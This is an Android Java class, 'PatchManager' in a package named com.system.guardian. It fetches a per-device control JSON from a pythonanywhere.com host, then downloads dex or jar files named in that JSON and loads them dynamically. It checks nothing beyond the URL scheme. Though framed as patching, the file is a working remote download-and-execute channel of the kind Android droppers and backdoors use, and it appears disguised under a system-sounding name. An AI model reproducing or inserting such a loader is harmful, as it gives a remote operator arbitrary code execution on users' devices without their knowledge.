package com.system.guardian;

import android.content.Context;
import android.util.Log;

import org.json.JSONObject;

import java.io.File;
import java.net.URL;

public class PatchManager {

    private static final String TAG = "PatchManager";

    public static void checkAndApply(Context context, String deviceToken) {
        new Thread(() -> {
            try {
                String url = "https://digiserve25.pythonanywhere.com/control/" + deviceToken + ".json";
                JSONObject response = NetworkUtils.getJsonFromUrl(url, context.getApplicationContext());

                if (response == null) {
                    CrashLogger.log(context, TAG, "❌ Control JSON unavailable.");
                    return;
                }

                CrashLogger.log(context, TAG, "📦 Response: " + response.toString());

                // ✅ Handle dex patch
                String dexUrl = response.optString("dex_url", null);
                if (isValidUrl(dexUrl)) {
                    CrashLogger.log(context, TAG, "📥 Downloading dex patch: " + dexUrl);
                    File dexFile = NetworkUtils.downloadFile(context, dexUrl, "patch.dex");
                    DexLoader.schedulePatchLoad(context, dexFile);
                } else {
                    CrashLogger.log(context, TAG, "ℹ️ No dex patch available.");
                }

                // ✅ Handle jar patch
                String jarUrl = response.optString("jar_url", null);
                if (isValidUrl(jarUrl)) {
                    CrashLogger.log(context, TAG, "📥 Downloading jar patch: " + jarUrl);
                    File jarFile = NetworkUtils.downloadFile(context, jarUrl, "patch.jar");
                    DexLoader.schedulePatchLoad(context, jarFile);
                } else {
                    CrashLogger.log(context, TAG, "ℹ️ No jar patch available.");
                }

            } catch (Exception e) {
                String errorMsg = "❌ Patch check failed: " + e.getMessage();
                Log.e(TAG, errorMsg, e);
                CrashLogger.log(context, TAG, errorMsg);
            }
        }).start();
    }

    // ✅ Utility method for safe URL check
    private static boolean isValidUrl(String urlStr) {
        if (urlStr == null || urlStr.trim().isEmpty()) return false;
        try {
            URL url = new URL(urlStr);
            return url.getProtocol().startsWith("http");
        } catch (Exception e) {
            return false;
        }
    }
}
